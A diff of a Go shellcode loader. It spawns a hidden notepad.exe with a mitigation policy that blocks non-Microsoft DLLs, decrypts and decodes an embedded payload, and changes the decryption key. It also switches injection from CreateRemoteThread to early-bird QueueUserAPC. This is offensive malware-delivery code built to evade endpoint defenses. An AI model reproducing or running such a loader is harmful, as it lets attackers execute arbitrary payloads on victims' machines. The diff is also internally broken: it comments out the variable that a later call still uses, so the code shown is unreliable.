@@ -34,8 +34,8 @@ func main() {
 	mitigate := 0x20007 //"PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY"
 
 	//Options for Block Dlls
-	nonms := uintptr(0x100000000000) //"PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON"
-	//onlystore := uintptr(0x300000000000) //"BLOCK_NON_MICROSOFT_BINARIES_ALLOW_STORE"
+	//nonms := uintptr(0x100000000000) //"PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON"
+	onlystore := uintptr(0x300000000000) //"BLOCK_NON_MICROSOFT_BINARIES_ALLOW_STORE"
 
 	//Update to block dlls
 	syscalls.UpdateProcThreadAttribute(startupInfo.AttributeList, 0, uintptr(mitigate), &nonms, unsafe.Sizeof(nonms), 0, nil)
@@ -60,9 +60,9 @@ func main() {
 		startupInfo.Cb = uint32(unsafe.Sizeof(startupInfo))
 		startupInfo.Flags |= windows.STARTF_USESHOWWINDOW
 		//startupInfo.ShowWindow = windows.SW_HIDE
-		creationFlags := windows.CREATE_SUSPENDED | windows.CREATE_NO_WINDOW | windows.EXTENDED_STARTUPINFO_PRESENT
+		//creationFlags := windows.CREATE_SUSPENDED | windows.CREATE_NO_WINDOW | windows.EXTENDED_STARTUPINFO_PRESENT
 		//creationFlags := windows.CREATE_SUSPENDED | windows.EXTENDED_STARTUPINFO_PRESENT
-		//creationFlags := windows.CREATE_NO_WINDOW | windows.EXTENDED_STARTUPINFO_PRESENT
+		creationFlags := windows.CREATE_NO_WINDOW | windows.EXTENDED_STARTUPINFO_PRESENT
 		//creationFlags := windows.EXTENDED_STARTUPINFO_PRESENT
 		programPath := "c:\\windows\\system32\\notepad.exe"
 		utfProgramPath, _ := windows.UTF16PtrFromString(programPath)
@@ -70,7 +70,7 @@ func main() {
 
 		// Decode shellcode
 		hex2str, _ := hex.DecodeString(shelly.Sc)
-		shellc := useful.Decrypt([]byte(hex2str), "D00mfist")
+		shellc := useful.Decrypt([]byte(hex2str), "Lunar")
 		cspay, _ := hex.DecodeString(string(shellc))
 		decode, _ := b64.StdEncoding.DecodeString(string(cspay))
 
@@ -80,13 +80,13 @@ func main() {
 		//Choose A Proc Injection Method//
 
 		//CreateRemoteThread
-		var Proc, R_Addr, F = useful.WriteShellcode(injectinto, decode)
-		useful.ShellCodeCreateRemoteThread(Proc, R_Addr, F)
+		//var Proc, R_Addr, F = useful.WriteShellcode(injectinto, decode)
+		//useful.ShellCodeCreateRemoteThread(Proc, R_Addr, F)
 
 		//QueueUserAPC
-		//var victimHandle = procInfo.Thread
-		//var _, R_Addr, _ = useful.WriteShellcode(injectinto, decode)
-		//useful.EBAPCQueue(R_Addr,victimHandle)
+		var victimHandle = procInfo.Thread
+		var _, R_Addr, _ = useful.WriteShellcode(injectinto, decode)
+		useful.EBAPCQueue(R_Addr,victimHandle)
 	}
 
 }
